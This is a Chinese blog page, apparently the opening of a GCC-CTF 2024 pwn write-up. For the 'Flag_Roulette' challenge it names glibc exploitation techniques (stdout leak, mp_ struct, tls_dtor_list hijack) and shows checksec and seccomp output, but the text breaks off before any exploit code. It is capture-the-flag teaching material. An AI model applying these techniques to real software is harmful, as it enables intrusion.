<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="2024-03-05-GCC-CTF-Pwn_Writeups" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="2024-03-05-GCC-CTF" />
<meta property="og:description" content="2024-03-05-GCC-CTF" />
<link rel="canonical" href="http://localhost:4000/posts/GCC-CTF/" />
<meta property="og:url" content="http://localhost:4000/posts/GCC-CTF/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/log.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-03-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/log.png" />
<meta property="twitter:title" content="2024-03-05-GCC-CTF-Pwn_Writeups" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2024-03-07T00:00:00+08:00","datePublished":"2024-03-07T00:00:00+08:00","description":"2024-03-05-GCC-CTF","headline":"2024-03-05-GCC-CTF-Pwn_Writeups","image":"/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/log.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/GCC-CTF/"},"url":"http://localhost:4000/posts/GCC-CTF/"}</script>
<!-- End Jekyll SEO tag -->


  <title>2024-03-05-GCC-CTF-Pwn_Writeups | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>2024-03-05-GCC-CTF-Pwn_Writeups</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>2024-03-05-GCC-CTF-Pwn_Writeups</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1709740800"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2024/03/07
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/log.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/log.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="6265 字"
>
  <em>34 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h1 id="2024-03-05-gcc-ctf">2024-03-05-GCC-CTF</h1>

<p>https://gcc-ctf.com/</p>

<p>就看看题</p>

<h2 id="flag_roulette"><span class="me-2">Flag_Roulette</span><a href="#flag_roulette" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>Description</li>
</ul>

<blockquote>
  <p>Are you tired of solving challs?</p>

  <p>Here, have a little break. If we win my game, I will give you a flag.</p>

  <p>I promise you I will not cheat :)</p>

  <p>The flag is in the /flag file.</p>

  <p>Author: 0xdeadbeef</p>
</blockquote>

<p>‍</p>

<ul>
  <li>
    <p>Get</p>

    <ul>
      <li>​<code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>​ 泄露地址</li>
      <li>​<code class="language-plaintext highlighter-rouge">mp_</code>​ 结构题</li>
      <li>Attack <code class="language-plaintext highlighter-rouge">tls_dtor_list</code>​ 指针 ORW 利用</li>
    </ul>
  </li>
</ul>

<p>‍</p>

<h3 id="程序分析"><span class="me-2">程序分析</span><a href="#程序分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>所有安全措施似乎都处于活动状态.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">checksec</span> <span class="p">.</span><span class="o">/</span><span class="n">flag_roulette</span>
<span class="n">RELRO</span>           <span class="n">STACK</span> <span class="n">CANARY</span>      <span class="n">NX</span>            <span class="n">PIE</span>             <span class="n">RPATH</span>      <span class="n">RUNPATH</span>      <span class="n">Symbols</span>         <span class="n">FORTIFY</span> <span class="n">Fortified</span>       <span class="n">Fortifiable</span>     <span class="n">FILE</span>
<span class="n">Full</span> <span class="n">RELRO</span>      <span class="n">Canary</span> <span class="n">found</span>      <span class="n">NX</span> <span class="n">enabled</span>    <span class="n">PIE</span> <span class="n">enabled</span>     <span class="n">No</span> <span class="n">RPATH</span>   <span class="n">RW</span><span class="o">-</span><span class="n">RUNPATH</span>   <span class="mi">58</span> <span class="n">Symbols</span>        <span class="n">No</span>    <span class="mi">0</span>               <span class="mi">1</span>               <span class="p">.</span><span class="o">/</span><span class="n">flag_roulette</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>代码执行选项仅限于传统的开放式读写策略</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">flag_roulette</span>
 <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0b</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0013</span>
 <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0005</span>
 <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x08</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0013</span>
 <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">close</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mmap</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0013</span>
 <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0013</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>反编译，main 函数</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
